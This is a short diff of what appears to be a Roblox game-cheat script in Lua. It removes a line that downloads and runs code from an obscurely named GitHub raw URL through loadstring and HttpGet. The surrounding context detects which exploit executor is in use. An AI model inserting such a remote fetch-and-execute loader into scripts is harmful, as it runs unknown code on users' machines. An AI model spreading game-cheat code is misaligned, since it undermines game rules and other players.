@@ -159,7 +159,7 @@ spawn(function()
 	end
 	end)	
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/palacetamon098/gwamrbswhpouf/main/tshpwqklytuirxfzvb'))()
+
 
            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
